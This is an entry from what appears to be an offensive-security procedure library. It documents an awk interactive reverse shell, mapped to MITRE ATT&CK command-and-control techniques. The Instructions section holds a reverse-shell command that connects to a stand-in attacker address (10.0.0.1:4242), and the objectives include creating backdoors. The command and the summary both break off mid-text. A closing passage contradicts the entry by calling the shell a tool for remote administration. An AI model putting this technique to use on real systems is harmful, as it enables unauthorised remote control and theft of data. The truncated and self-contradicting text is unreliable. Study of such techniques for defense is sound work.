---
id: 4740b7e3-e67c-4fec-bea2-684a9bb6a3c4
name: Awk Interactive Reverse Shell
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.509302+00:00'
updated_at: '2023-04-10T20:25:25.230521+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
techniques:
- '[[Non-Standard Port|T1571 - Non-Standard Port]]'
- '[[Remote Access Tools|T1219 - Remote Access Tools]]'
tags:
- '[[Awk]]'
- '[[Reverse Shell]]'
- '[[Reverse Shell Cheat Sheet]]'
---

# Awk Interactive Reverse Shell

## Summary

This procedure uses the Awk command to establish an interactive reverse shell connection. Awk is a versatile tool that can manipulate text files and streams, and in this case, it is used to execute commands on the target machine. By using an interactive shell connection, an attacker can gain full a

## Description

# Description

This procedure uses the Awk command to establish an interactive reverse shell connection. Awk is a versatile tool that can manipulate text files and streams, and in this case, it is used to execute commands on the target machine. By using an interactive shell connection, an attacker can gain full access to the target machine and perform any action that a legitimate user can. This can include stealing data, installing malware, or creating backdoors for future access.

From a technical perspective, this procedure works by creating a network connection between the attacker's machine and the target machine. The Awk command is then used to execute a reverse shell payload, which connects back to the attacker's machine. The attacker can then interact with the target machine over this connection.

The business value of this procedure is that it allows an attacker to gain full access to a target machine, which can be used for a variety of malicious purposes.

 

## Requirements

1. Network access to the target machine

1. Ability to execute commands on the target machine

1. Knowledge of the Awk command

 

## Defense

1. Monitor network traffic for unusual connections or traffic on non-standard ports

1. Implement access controls and authentication mechanisms to prevent unauthorized access to the target machine

1. Regularly update and patch software to prevent vulnerabilities that could be exploited for this type of attack

 

## Objectives

1. Gain full access to the target machine

1. Execute commands on the target machine

1. Create a backdoor for future access

 

# Instructions

1. This command creates an interactive shell connection to a remote machine using the awk command. The connection is established over TCP/IP and the remote machine's IP address and port number need to be specified in the command. Once the connection is established, a shell prompt is displayed and commands can be executed on the remote machine. The 'exit' command is used to terminate the connection.

 



**Code**: [[awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while]]



> The 'awk' command is used to establish a TCP/IP connection to the remote machine. The IP address and port number of the remote machine need to be specified in the command. Once the connection is established, a shell prompt is displayed and commands can be executed on the remote machine. The 'exit' command is used to terminate the connection. This command can be useful for remote administration and troubleshooting.

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]

### Techniques

- [[Non-Standard Port|T1571 - Non-Standard Port]]
- [[Remote Access Tools|T1219 - Remote Access Tools]]

## Tags

- [[Awk]]
- [[Reverse Shell]]
- [[Reverse Shell Cheat Sheet]]


